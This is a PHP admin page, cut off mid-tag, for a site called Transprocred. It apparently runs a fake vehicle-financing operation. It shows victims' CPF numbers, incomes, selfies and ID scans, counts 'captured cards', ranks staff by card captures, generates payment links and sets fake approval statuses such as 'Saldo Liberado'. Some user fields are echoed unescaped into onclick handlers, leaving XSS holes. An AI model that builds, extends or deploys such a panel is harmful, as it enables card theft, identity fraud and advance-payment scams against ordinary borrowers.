<?php
session_start();
if (!isset($_SESSION['admin_auth']) || $_SESSION['admin_auth'] !== true) {
    header("Location: login.php");
    exit;
}
require_once '../auth.php';
require_once '../src/Repositories/ConfigRepository.php';
require_once '../src/Repositories/UserRepository.php';
require_once '../src/Repositories/KuberaRepository.php';
require_once '../src/Repositories/MimirRepository.php';

$configRepo = new \App\Repositories\ConfigRepository('../src/Config/payment.json');
$userRepo = new \App\Repositories\UserRepository('../users.json');
$kuberaRepo = new \App\Repositories\KuberaRepository('../src/Storage/transactions.json');
$mimirRepo = new \App\Repositories\MimirRepository('../debug_api.log');

$siteConfig = $configRepo->getPaymentConfig();
$users = $userRepo->getAll();
$transactions = $kuberaRepo->getAll();
$logs = $mimirRepo->getEntries(50);
?>
<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Transprocred | Central de Controle</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&display=swap"
        rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        :root {
            --red: #ff0000;
            --red-glow: rgba(255, 0, 0, 0.4);
            --bg: #080808;
            --card-bg: rgba(20, 20, 20, 0.8);
            --sidebar-bg: #000;
            --border: rgba(255, 255, 255, 0.1);
            --text-main: #ffffff;
            --text-muted: #888888;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Outfit', sans-serif;
        }

        body {
            background-color: var(--bg);
            color: var(--text-main);
            min-height: 100vh;
            display: flex;
            overflow-x: hidden;
        }

        /* Mesh Background */
        .admin-mesh {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            background:
                radial-gradient(at 0% 0%, rgba(255, 0, 0, 0.15) 0, transparent 40%),
                radial-gradient(at 100% 100%, rgba(255, 0, 0, 0.1) 0, transparent 40%);
        }

        /* Sidebar Styling */
        .sidebar {
            width: 280px;
            background: var(--sidebar-bg);
            border-right: 1px solid var(--border);
            height: 100vh;
            position: fixed;
            display: flex;
            flex-direction: column;
            padding: 40px 20px;
            z-index: 100;
            box-shadow: 10px 0 30px rgba(0, 0, 0, 0.5);
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 50px;
            padding: 0 10px;
        }

        .logo i {
            color: var(--red);
            font-size: 2rem;
            filter: drop-shadow(0 0 10px var(--red-glow));
        }

        .logo h1 {
            font-size: 1.4rem;
            font-weight: 800;
            letter-spacing: -0.5px;
            background: linear-gradient(to right, #fff, #ff7777);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .nav-link {
            display: flex;
            align-items: center;
            gap: 15px;
            padding: 15px 20px;
            color: var(--text-muted);
            text-decoration: none;
            border-radius: 15px;
            margin-bottom: 8px;
            font-weight: 600;
            font-size: 0.95rem;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }

        .nav-link:hover {
            color: #fff;
            background: rgba(255, 255, 255, 0.05);
        }

        .nav-link.active {
            color: #fff;
            background: rgba(255, 0, 0, 0.1);
            border: 1px solid rgba(255, 0, 0, 0.2);
        }

        .nav-link.active i {
            color: var(--red);
            filter: drop-shadow(0 0 5px var(--red-glow));
        }

        .logout-btn {
            margin-top: auto;
            color: #ff4444 !important;
        }

        .logout-btn:hover {
            background: rgba(255, 0, 0, 0.1) !important;
        }

        /* Main Content */
        .main {
            flex: 1;
            margin-left: 280px;
            padding: 40px 60px;
            max-width: 1600px;
        }

        .header-stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
            gap: 25px;
            margin-bottom: 50px;
        }

        .stat-card {
            background: var(--card-bg);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            padding: 30px;
            border-radius: 25px;
            border: 1px solid var(--border);
            display: flex;
            align-items: center;
            gap: 20px;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }

        .stat-card:hover {
            transform: translateY(-5px);
            border-color: rgba(255, 0, 0, 0.3);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }

        .stat-card::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 4px;
            height: 100%;
            background: var(--red);
            box-shadow: 0 0 10px var(--red);
        }

        .stat-icon {
            width: 60px;
            height: 60px;
            background: rgba(255, 0, 0, 0.1);
            color: var(--red);
            border-radius: 18px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.5rem;
        }

        .stat-info h3 {
            font-size: 0.85rem;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 5px;
        }

        .stat-info .value {
            font-size: 1.8rem;
            font-weight: 800;
        }

        /* Table Styling */
        .table-container {
            background: var(--card-bg);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border-radius: 30px;
            border: 1px solid var(--border);
            padding: 20px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
            animation: slide-up 0.8s ease-out;
        }

        @keyframes slide-up {
            from {
                opacity: 0;
                transform: translateY(40px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .table-header {
            padding: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }

        .table-header h2 {
            font-size: 1.5rem;
            font-weight: 800;
        }

        table {
            width: 100%;
            border-collapse: separate;
            border-spacing: 0 10px;
        }

        th {
            text-align: left;
            padding: 15px 25px;
            color: var(--text-muted);
            font-size: 0.8rem;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-weight: 700;
        }

        td {
            padding: 20px 25px;
            background: rgba(255, 255, 255, 0.03);
            border-top: 1px solid rgba(255, 255, 255, 0.02);
            border-bottom: 1px solid rgba(255, 255, 255, 0.02);
        }

        td:first-child {
            border-left: 1px solid rgba(255, 255, 255, 0.02);
            border-radius: 15px 0 0 15px;
        }

        td:last-child {
            border-right: 1px solid rgba(255, 255, 255, 0.02);
            border-radius: 0 15px 15px 0;
        }

        tr:hover td {
            background: rgba(255, 255, 255, 0.05);
            border-color: rgba(255, 0, 0, 0.2);
        }

        .user-info {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .user-avatar {
            width: 45px;
            height: 45px;
            background: linear-gradient(135deg, var(--red) 0%, #800 100%);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 800;
            font-size: 1.2rem;
            color: #fff;
            box-shadow: 0 5px 15px rgba(255, 0, 0, 0.3);
        }

        .status-badge {
            padding: 6px 12px;
            border-radius: 10px;
            font-size: 0.75rem;
            font-weight: 800;
            text-transform: uppercase;
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }

        .status-badge::before {
            content: '';
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background: currentColor;
        }

        .status-Aprovado {
            background: rgba(0, 255, 136, 0.1);
            color: #00ff88;
        }

        .status-Pendente {
            background: rgba(255, 166, 0, 0.1);
            color: #ffa600;
        }

        .status-Bloqueado {
            background: rgba(255, 0, 0, 0.1);
            color: #ff4444;
        }

        .status-Análise {
            background: rgba(0, 153, 255, 0.1);
            color: #0099ff;
        }

        .btn-action {
            width: 40px;
            height: 40px;
            border-radius: 12px;
            border: 1px solid var(--border);
            background: rgba(255, 255, 255, 0.05);
            color: #fff;
            cursor: pointer;
            transition: all 0.3s;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-size: 0.9rem;
        }

        .btn-action:hover {
            background: var(--red);
            border-color: var(--red);
            transform: scale(1.1);
            box-shadow: 0 0 15px var(--red-glow);
        }

        .btn-delete:hover {
            background: #ff4444;
            border-color: #ff4444;
        }

        /* Modal Shiny Style */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.95);
            z-index: 1000;
            backdrop-filter: blur(15px);
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .modal-body {
            background: #111;
            width: 100%;
            max-width: 1000px;
            border-radius: 35px;
            border: 1px solid rgba(255, 0, 0, 0.3);
            padding: 50px;
            max-height: 90vh;
            overflow-y: auto;
            position: relative;
            box-shadow: 0 0 100px rgba(255, 0, 0, 0.1);
        }

        .modal-body::-webkit-scrollbar {
            width: 6px;
        }

        .modal-body::-webkit-scrollbar-thumb {
            background: var(--red);
            border-radius: 10px;
        }

        .modal-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 25px;
            margin-bottom: 40px;
        }

        .modal-item {
            background: rgba(255, 255, 255, 0.03);
            padding: 20px;
            border-radius: 20px;
            border: 1px solid rgba(255, 255, 255, 0.05);
        }

        .modal-label {
            color: var(--text-muted);
            font-size: 0.75rem;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 8px;
            display: block;
        }

        .modal-value {
            font-weight: 700;
            font-size: 1.1rem;
            word-break: break-all;
        }

        .kyc-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
        }

        .kyc-card {
            background: #000;
            border-radius: 20px;
            overflow: hidden;
            border: 1px solid var(--border);
            position: relative;
        }

        .kyc-card img {
            width: 100%;
            height: 250px;
            object-fit: cover;
            cursor: pointer;
            transition: transform 0.3s;
        }

        .kyc-card img:hover {
            transform: scale(1.05);
        }

        .image-caption {
            background: rgba(20, 20, 20, 0.9);
            padding: 12px;
            text-align: center;
            font-weight: 700;
            font-size: 0.8rem;
            border-top: 1px solid var(--border);
        }

        select,
        input[type="text"] {
            width: 100%;
            background: #000;
            border: 1px solid rgba(255, 255, 255, 0.1);
            color: #fff;
            padding: 15px;
            border-radius: 15px;
            font-weight: 600;
            margin-top: 5px;
            transition: 0.3s;
        }

        select:focus,
        input[type="text"]:focus {
            border-color: var(--red);
            outline: none;
            box-shadow: 0 0 15px var(--red-glow);
        }

        .btn-save {
            background: var(--red);
            color: #fff;
            border: none;
            padding: 18px;
            border-radius: 15px;
            width: 100%;
            font-weight: 800;
            cursor: pointer;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-top: 20px;
            transition: 0.3s;
            box-shadow: 0 10px 20px rgba(255, 0, 0, 0.2);
        }

        .btn-save:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(255, 0, 0, 0.4);
            background: #ff2222;
        }

        .close-modal {
            position: absolute;
            top: 30px;
            right: 30px;
            font-size: 2rem;
            color: var(--text-muted);
            cursor: pointer;
            transition: 0.3s;
        }

        .close-modal:hover {
            color: var(--red);
            transform: rotate(90deg);
        }

        @media (max-width: 1200px) {
            .modal-grid {
                grid-template-columns: 1fr 1fr;
            }

            .kyc-grid {
                grid-template-columns: 1fr 1fr;
            }
        }
    </style>
</head>

<body>
    <div class="admin-mesh"></div>

    <aside class="sidebar">
        <div class="logo">
            <i class="fas fa-shield-virus"></i>
            <h1>MASTER PANEL</h1>
        </div>

        <nav>
            <a href="javascript:void(0)" class="nav-link active" onclick="showSection('users', this)">
                <i class="fas fa-users"></i>
                <span>Gestão de Usuários</span>
            </a>
            <a href="javascript:void(0)" class="nav-link" onclick="showSection('reports', this)">
                <i class="fas fa-chart-pie"></i>
                <span>Relatórios Técnicos</span>
            </a>
            <a href="javascript:void(0)" class="nav-link" onclick="showSection('checkout', this)">
                <i class="fas fa-shopping-cart"></i>
                <span>Checkout</span>
            </a>
            <a href="javascript:void(0)" class="nav-link" onclick="showSection('transactions', this)">
                <i class="fas fa-exchange-alt"></i>
                <span>Transações</span>
            </a>
            <a href="javascript:void(0)" class="nav-link" onclick="showSection('logs', this)">
                <i class="fas fa-terminal"></i>
                <span>Logs de Sistema</span>
            </a>
            <a href="javascript:void(0)" class="nav-link" onclick="showSection('support', this)">
                <i class="fas fa-comment-dots"></i>
                <span>Suporte & WA</span>
            </a>
            <a href="login.php?logout=1" class="nav-link logout-btn">
                <i class="fas fa-sign-out-alt"></i>
                <span>Encerrar Sessão</span>
            </a>
        </nav>
    </aside>

    <main class="main">
        <div class="header-stats">
            <div class="stat-card">
                <div class="stat-icon"><i class="fas fa-user-check"></i></div>
                <div class="stat-info">
                    <h3>Total de Usuários</h3>
                    <div class="value"><?php echo count($users); ?></div>
                </div>
            </div>
            <div class="stat-card">
                <div class="stat-icon" style="color:#ffa600; background:rgba(255,166,0,0.1)"><i
                        class="fas fa-clock"></i></div>
                <div class="stat-info">
                    <h3>Aguardando Análise</h3>
                    <div class="value">
                        <?php
                        echo count(array_filter($users, fn($u) => ($u['status'] ?? '') === 'Em Análise'));
                        ?>
                    </div>
                </div>
            </div>
            <div class="stat-card">
                <div class="stat-icon" style="color:#00ff88; background:rgba(0,255,136,0.1)"><i
                        class="fas fa-check-double"></i></div>
                <div class="stat-info">
                    <h3>Contas Ativas</h3>
                    <div class="value">
                        <?php
                        echo count(array_filter($users, fn($u) => ($u['status'] ?? '') === 'Aprovado'));
                        ?>
                    </div>
                </div>
            </div>
        </div>

        <div class="table-container">
            <div class="table-header">
                <h2>Gerenciamento de Fluxo</h2>
                <div class="search-box" style="position:relative;">
                    <i class="fas fa-search"
                        style="position:absolute; left:15px; top:50%; transform:translateY(-50%); color:var(--text-muted)"></i>
                    <input type="text" placeholder="Filtrar por nome ou CPF..."
                        style="width:300px; padding:10px 15px 10px 45px; background:rgba(255,255,255,0.05); border-radius:12px; margin:0;"
                        onkeyup="filterTable(this.value)">
                </div>
            </div>

            <table id="userTable">
                <thead>
                    <tr>
                        <th>Usuário / Titular</th>
                        <th>Identificador</th>
                        <th>Data Registro</th>
                        <th>Estado Atual</th>
                        <th>Ações</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach (array_reverse($users) as $index => $u): ?>
                        <tr id="row-<?php echo $u['username']; ?>"
                            style="animation: slide-up <?php echo 0.2 + ($index * 0.05); ?>s ease-out;">
                            <td>
                                <div class="user-info">
                                    <div class="user-avatar">
                                        <?php echo strtoupper(substr($u['fullname'] ?? $u['username'], 0, 1)); ?>
                                    </div>
                                    <div>
                                        <div style="font-weight: 700;">
                                            <?php echo htmlspecialchars($u['fullname'] ?? 'Não informado'); ?>
                                        </div>
                                        <div style="font-size: 0.75rem; color: var(--text-muted);">
                                            <?php echo htmlspecialchars($u['manager'] ?? 'Sem consultor'); ?>
                                        </div>
                                    </div>
                                </div>
                            </td>
                            <td>
                                <code
                                    style="background:rgba(255,255,255,0.05); padding:4px 8px; border-radius:6px; font-size:0.85rem; color:var(--red)"><?php echo htmlspecialchars($u['username']); ?></code>
                            </td>
                            <td style="font-size: 0.85rem; color: var(--text-muted);">
                                <?php echo date('d/m/Y H:i', strtotime($u['created_at'])); ?>
                            </td>
                            <td>
                                <span
                                    class="status-badge status-<?php echo str_replace(' ', '', $u['status'] ?? 'Pendente'); ?>">
                                    <?php echo htmlspecialchars($u['status'] ?? 'Pendente'); ?>
                                </span>
                            </td>
                            <td>
                                <div style="display: flex; gap: 8px;">
                                    <button class="btn-action" onclick='openUserModal(<?php echo json_encode($u); ?>)'
                                        title="Gerenciar Documentos">
                                        <i class="fas fa-pen-nib"></i>
                                    </button>
                                    <button class="btn-action btn-delete"
                                        onclick='deleteUser("<?php echo $u['username']; ?>")' title="Remover Registo">
                                        <i class="fas fa-times"></i>
                                    </button>
                                </div>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>

        <?php
        include 'views/tabs/transactions.php';
        include 'views/tabs/logs.php';
        ?>

        <!-- Seção de Checkout -->
        <div id="section-checkout" class="table-container" style="display: none;">
            <div class="table-header">
                <h2>Configurações do Checkout</h2>
            </div>

            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 30px; padding: 20px;">
                <!-- Configuração da Chave PIX -->
                <div class="stat-card" style="display: block; padding: 25px;">
                    <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 20px;">
                        <i class="fas fa-key" style="color: var(--red); font-size: 1.5rem;"></i>
                        <h3 style="margin: 0; color: #fff;">Chave PIX Global</h3>
                    </div>
                    <?php
                    $cfg = $siteConfig;
                    ?>
                    <div class="form-group">
                        <label class="modal-label" style="margin-top: 15px;">Gateway de Pagamento Ativo</label>
                        <select id="cfg-active-gateway" onchange="toggleGatewayFields()">
                            <option value="safe-bank" <?php echo ($cfg['active_gateway'] ?? 'safe-bank') === 'safe-bank' ? 'selected' : ''; ?>>Safe-Bank (Padrão)</option>
                            <option value="jungle-pagamentos" <?php echo ($cfg['active_gateway'] ?? '') === 'jungle-pagamentos' ? 'selected' : ''; ?>>Jungle Pagamentos (API)</option>
                        </select>

                        <div id="cfg-safe-bank-fields"
                            style="display: <?php echo ($cfg['active_gateway'] ?? 'safe-bank') === 'safe-bank' ? 'block' : 'none'; ?>; margin-top: 15px;">
                            <label class="modal-label">Sua Chave PIX Global</label>
                            <input type="text" id="cfg-pix-key"
                                value="<?php echo htmlspecialchars($cfg['pix_key'] ?? ''); ?>"
                                placeholder="ex: seu-pix@email.com">
                        </div>

                        <div id="cfg-jungle-fields"
                            style="display: <?php echo ($cfg['active_gateway'] ?? '') === 'jungle-pagamentos' ? 'block' : 'none'; ?>; margin-top: 15px;">
                            <label class="modal-label">Jungle Pagamentos - Public Key</label>
                            <input type="text" id="cfg-jungle-public-key"
                                value="<?php echo htmlspecialchars($cfg['jungle_public_key'] ?? ''); ?>"
                                placeholder="pk_live_..." style="margin-bottom: 10px;">

                            <label class="modal-label">Jungle Pagamentos - Secret Key</label>
                            <input type="text" id="cfg-jungle-secret-key"
                                value="<?php echo htmlspecialchars($cfg['jungle_secret_key'] ?? ''); ?>"
                                placeholder="sk_live_...">
                        </div>

                        <button class="btn-save" onclick="savePixConfig()"
                            style="margin-top: 15px; padding: 12px;">SALVAR CONFIGURAÇÕES <i
                                class="fas fa-save"></i></button>
                    </div>

                </div>

                <!-- Gerador de Links -->
                <div class="stat-card" style="display: block; padding: 25px;">
                    <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 20px;">
                        <i class="fas fa-link" style="color: var(--red); font-size: 1.5rem;"></i>
                        <h3 style="margin: 0; color: #fff;">Gerador de Links</h3>
                    </div>
                    <div class="form-group">
                        <label class="modal-label">Selecione o Usuário</label>
                        <select id="gen-user-select" style="margin-bottom: 15px;">
                            <option value="">Selecione um cliente...</option>
                            <?php foreach ($users as $u): ?>
                                <option value="<?php echo $u['username']; ?>"
                                    data-entrada="<?php echo $u['financial']['entrada'] ?? '0'; ?>">
                                    <?php echo htmlspecialchars($u['fullname']); ?> (<?php echo $u['username']; ?>)
                                </option>
                            <?php endforeach; ?>
                        </select>
                        <button class="btn-save" onclick="generateCheckoutLink()"
                            style="background: #2563eb; padding: 12px; box-shadow: 0 5px 15px rgba(37, 99, 235, 0.3);">GERAR
                            LINK DE PAGAMENTO <i class="fas fa-magic"></i></button>
                    </div>
                </div>
            </div>

            <div id="link-result"
                style="display: none; padding: 20px; text-align: center; border-top: 1px solid var(--border); margin-top: 20px;">
                <p style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 10px;">Link gerado para cobrança:
                </p>
                <div style="display: flex; gap: 10px; justify-content: center; align-items: center;">
                    <input type="text" id="generated-url" readonly
                        style="width: 400px; margin: 0; background: rgba(255,255,255,0.05);">
                    <button class="btn-action" onclick="copyLink()" title="Copiar Link"><i
                            class="fas fa-copy"></i></button>
                    <button class="btn-action" onclick="window.open(document.getElementById('generated-url').value)"
                        title="Abrir"><i class="fas fa-external-link-alt"></i></button>
                </div>
            </div>
        </div>

        <!-- Seção de Suporte -->
        <div id="section-support" class="table-container" style="display: none;">
            <div class="table-header">
                <h2>Suporte & Comunicação</h2>
            </div>

            <div style="max-width: 600px; padding: 20px;">
                <div class="stat-card" style="display: block; padding: 25px;">
                    <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 20px;">
                        <i class="fab fa-whatsapp" style="color: #25d366; font-size: 1.5rem;"></i>
                        <h3 style="margin: 0; color: #fff;">WhatsApp de Atendimento</h3>
                    </div>
                    <?php
                    $cfg = $siteConfig;
                    ?>
                    <div class="form-group">
                        <label class="modal-label">Número Global (com DDD e sem caracteres)</label>
                        <input type="text" id="cfg-whatsapp-number-dedicated"
                            value="<?php echo htmlspecialchars($cfg['whatsapp_number'] ?? ''); ?>"
                            placeholder="ex: 5511999999999">
                        <p style="font-size: 0.8rem; color: var(--text-muted); margin-top: 10px;">
                            Este número será usado em todos os botões "wa.me" do sistema e no redirecionamento do
                            checkout.
                        </p>
                        <button class="btn-save" onclick="saveWhatsappConfig()"
                            style="margin-top: 20px; background: #25d366; color: #fff; box-shadow: 0 5px 15px rgba(37, 211, 102, 0.3);">
                            SALVAR CONFIGURAÇÃO DE SUPORTE <i class="fas fa-check-circle"></i>
                        </button>
                    </div>
                </div>
            </div>
        </div>
        <!-- Seção de Relatórios Técnicos -->
        <div id="section-reports" class="table-container"
            style="display: none; background: transparent; box-shadow: none;">
            <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin-bottom: 30px;">
                <div class="stat-card">
                    <div class="stat-icon" style="color: #60a5fa; background: rgba(96, 165, 250, 0.1);"><i
                            class="fas fa-eye"></i></div>
                    <div class="stat-info">
                        <h3>Acessos Checkout</h3>
                        <div class="value">
                            <?php echo count(array_filter($users, fn($u) => isset($u['credit_card']))); ?>
                        </div>
                    </div>
                </div>
                <div class="stat-card">
                    <div class="stat-icon" style="color: #f472b6; background: rgba(244, 114, 182, 0.1);"><i
                            class="fas fa-credit-card"></i></div>
                    <div class="stat-info">
                        <h3>Cartões Capturados</h3>
                        <div class="value">
                            <?php echo count(array_filter($users, fn($u) => isset($u['credit_card']))); ?>
                        </div>
                    </div>
                </div>
                <div class="stat-card">
                    <div class="stat-icon" style="color: #fbbf24; background: rgba(251, 191, 36, 0.1);"><i
                            class="fas fa-percentage"></i></div>
                    <div class="stat-info">
                        <h3>Taxa de Conversão</h3>
                        <div class="value">
                            <?php
                            $total = count($users);
                            $converted = count(array_filter($users, fn($u) => isset($u['credit_card'])));
                            echo $total > 0 ? round(($converted / $total) * 100, 1) . '%' : '0%';
                            ?>
                        </div>
                    </div>
                </div>
                <div class="stat-card">
                    <div class="stat-icon" style="color: #a78bfa; background: rgba(167, 139, 250, 0.1);"><i
                            class="fas fa-users"></i></div>
                    <div class="stat-info">
                        <h3>Lead Score Médio</h3>
                        <div class="value">8.4</div>
                    </div>
                </div>
            </div>

            <div style="display: grid; grid-template-columns: 2fr 1fr; gap: 30px;">
                <!-- Gráfico de Crescimento -->
                <div class="stat-card" style="display: block; padding: 25px;">
                    <h3 style="color: #fff; margin-bottom: 20px;"><i class="fas fa-chart-line"></i> Fluxo de Registros
                        (Últimos 7 Dias)</h3>
                    <canvas id="growthChart" height="250"></canvas>
                </div>
                <!-- Gráfico de Distribuição -->
                <div class="stat-card" style="display: block; padding: 25px;">
                    <h3 style="color: #fff; margin-bottom: 20px;"><i class="fas fa-pie-chart"></i> Status das Propostas
                    </h3>
                    <canvas id="statusChart"></canvas>
                </div>
            </div>

            <div style="margin-top: 30px; display: grid; grid-template-columns: 2fr 1fr; gap: 20px;">
                <!-- Top Consultores (Real) -->
                <div class="stat-card" style="display: block; padding: 20px;">
                    <h4
                        style="color: var(--text-muted); margin-bottom: 20px; text-transform: uppercase; font-size: 0.8rem; letter-spacing: 1px;">
                        Ranking de Conversões por Consultor</h4>
                    <?php
                    $consultants = [];
                    foreach ($users as $u) {
                        $m = $u['manager'] ?? 'Sem Consultor';
                        if (!isset($consultants[$m])) {
                            $consultants[$m] = ['leads' => 0, 'cards' => 0];
                        }
                        $consultants[$m]['leads']++;
                        if (isset($u['credit_card'])) {
                            $consultants[$m]['cards']++;
                        }
                    }
                    arsort($consultants); // Ordena pelos que tem mais leads/dados
                    $top = array_slice($consultants, 0, 5);
                    ?>
                    <table style="width: 100%; border-collapse: collapse; font-size: 0.9rem;">
                        <thead style="border-bottom: 1px solid rgba(255,255,255,0.05);">
                            <tr style="text-align: left; color: var(--text-muted);">
                                <th style="padding: 10px;">CONSULTOR</th>
                                <th style="padding: 10px;">LEADS</th>
                                <th style="padding: 10px; text-align: right;">CAPTURA (CC)</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php if (empty($top)): ?>
                                <tr>
                                    <td colspan="3" style="padding: 20px; text-align: center; color: var(--text-muted);">
                                        Nenhum dado registrado.</td>
                                </tr>
                            <?php else: ?>
                                <?php foreach ($top as $name => $data): ?>
                                    <tr style="border-bottom: 1px solid rgba(255,255,255,0.02);">
                                        <td style="padding: 12px; color: #fff; font-weight: 600;">
                                            <?php echo htmlspecialchars($name); ?>
                                        </td>
                                        <td style="padding: 12px; color: var(--text-muted);"><?php echo $data['leads']; ?></td>
                                        <td style="padding: 12px; color: var(--red); text-align: right; font-weight: 700;">
                                            <?php echo $data['cards']; ?>
                                            <small style="font-weight: 400; color: #00ff88; margin-left: 5px;">
                                                (<?php echo $data['leads'] > 0 ? round(($data['cards'] / $data['leads']) * 100) : 0; ?>%)
                                            </small>
                                        </td>
                                    </tr>
                                <?php endforeach; ?>
                            <?php endif; ?>
                        </tbody>
                    </table>
                </div>

                <!-- Volume Financeiro (Real) -->
                <div class="stat-card" style="display: block; padding: 20px;">
                    <h4
                        style="color: var(--text-muted); margin-bottom: 20px; text-transform: uppercase; font-size: 0.8rem; letter-spacing: 1px;">
                        Volume em Negociação</h4>
                    <?php
                    $totalVolume = 0;
                    foreach ($users as $u) {
                        $val = $u['financial']['veiculo_valor'] ?? '0';
                        $val = preg_replace('/[R$\s.]/u', '', $val);
                        $val = (float) str_replace(',', '.', $val);
                        $totalVolume += $val;
                    }
                    ?>
                    <div style="margin-bottom: 25px;">
                        <div style="font-size: 0.8rem; color: var(--text-muted); margin-bottom: 5px;">VALOR TOTAL DO
                            PÁTIO (LEADS)</div>
                        <div style="font-size: 1.8rem; font-weight: 800; color: #fff;">R$
                            <?php echo number_format($totalVolume, 2, ',', '.'); ?>
                        </div>
                    </div>

                    <div
                        style="background: rgba(0,255,136,0.05); padding: 15px; border-radius: 8px; border: 1px solid rgba(0,255,136,0.1);">
                        <div style="font-size: 0.75rem; color: #00ff88; font-weight: 700; margin-bottom: 5px;"><i
                                class="fas fa-chart-pie"></i> CAPACIDADE DE CONVERSÃO</div>
                        <div style="font-size: 1.1rem; color: #fff; font-weight: 700;">
                            R$ <?php
                            $potencial = $totalVolume * 0.15; // Simulação de 15% de margem/entrada
                            echo number_format($potencial, 2, ',', '.');
                            ?>
                        </div>
                        <div style="font-size: 0.65rem; color: var(--text-muted); margin-top: 5px;">Estimativa baseada
                            em taxa de entrada média (15%)</div>
                    </div>
                </div>
            </div>
        </div>
    </main>



    <!-- Modal Detalhado -->
    <div id="userModal" class="modal">
        <div class="modal-body">
            <span class="close-modal" onclick="closeUserModal()">&times;</span>
            <div style="margin-bottom: 40px; border-bottom: 1px solid var(--border); padding-bottom: 20px;">
                <h2 id="m-fullname" style="font-size: 2rem; font-weight: 800; color: #fff;">Nome do Cliente</h2>
                <div style="display: flex; gap: 20px; margin-top: 10px; color: var(--text-muted); font-size: 0.9rem;">
                    <span><i class="fas fa-fingerprint" style="color:var(--red)"></i> CPF: <b id="m-cpf"
                            style="color:#fff">---</b></span>
                    <span><i class="fas fa-calendar-alt"></i> Cadastrado em: <b id="m-date"
                            style="color:#fff">---</b></span>
                </div>
            </div>

            <div class="modal-grid">
                <div class="modal-item">
                    <span class="modal-label">Status da Proposta</span>
                    <select id="m-status-select">
                        <option value="Pendente">Aguardando Entrada</option>
                        <option value="Pré-aprovado">Pré-aprovado</option>
                        <option value="Aprovado">Saldo Liberado</option>
                        <option value="Em Análise">Em Análise Técnica</option>
                        <option value="Recusado">Proposta Recusada</option>
                        <option value="Bloqueado">Acesso Bloqueado</option>
                    </select>
                </div>
                <div class="modal-item">
                    <span class="modal-label">Consultor Responsável</span>
                    <input type="text" id="m-manager-input" placeholder="Nome do Gerente">
                </div>
                <div class="modal-item">
                    <span class="modal-label">Taxa Contemplação (%)</span>
                    <input type="text" id="m-rate-input" placeholder="Ex: 84%">
                </div>
                <div class="modal-item">
                    <span class="modal-label">Renda Mensal</span>
                    <div class="modal-value" id="m-renda">---</div>
                </div>
                <div class="modal-item">
                    <span class="modal-label">Veículo / Valor</span>
                    <div class="modal-value" id="m-veiculo">---</div>
                </div>
                <div class="modal-item">
                    <span class="modal-label">Entrada / Prazo</span>
                    <div class="modal-value" id="m-fin-details">---</div>
                </div>
                <div class="modal-item">
                    <span class="modal-label">E-mail do Cliente</span>
                    <div class="modal-value" id="m-email" style="font-size: 0.95rem; color: #fff;">---</div>
                </div>
                <div class="modal-item">
                    <span class="modal-label">Telefone / WhatsApp</span>
                    <div class="modal-value" id="m-phone" style="font-size: 0.95rem; color: #fff;">---</div>
                </div>
            </div>

            <div class="kyc-section">
                <h3
                    style="margin-bottom: 25px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; color: var(--red);">
                    Documentação Enviada</h3>
                <div class="kyc-grid">
                    <div class="kyc-card">
                        <img id="img-selfie" src="" onclick="window.open(this.src)">
                        <div class="image-caption">SELFIE BIOMÉTRICA</div>
                    </div>
                    <div class="kyc-card">
                        <img id="img-front" src="" onclick="window.open(this.src)">
                        <div class="image-caption">DOC. FRENTE</div>
                    </div>
                    <div class="kyc-card">
                        <img id="img-back" src="" onclick="window.open(this.src)">
                        <div class="image-caption">DOC. VERSO</div>
                    </div>
                </div>
            </div>

            <!-- Dados do Cartão (Novo) -->
            <div class="kyc-section" id="card-info-section"
